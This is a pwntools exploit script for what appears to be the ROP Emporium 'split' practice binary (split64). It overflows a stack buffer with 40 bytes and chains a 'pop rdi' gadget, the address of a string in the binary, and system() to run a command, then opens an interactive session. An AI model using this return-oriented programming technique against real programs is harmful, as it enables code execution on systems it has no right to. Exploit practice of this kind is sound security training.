#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('split64')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)


# In 64bit arguments are taken from regs

#print(hex(exe.symbols.system))
#print(hex(exe.symbols.usefulString))

io = start()
io.recvuntil("> ")
poprdi = p64(0x00000000004007c3)
flag = p64(exe.symbols.usefulString)
system = p64(0x400560)

buf = ""
buf += "A"*40
buf += poprdi
buf += flag
buf += system



#write("in.txt", buf)

io.sendline(buf)

print(io.recvline())
io.interactive()

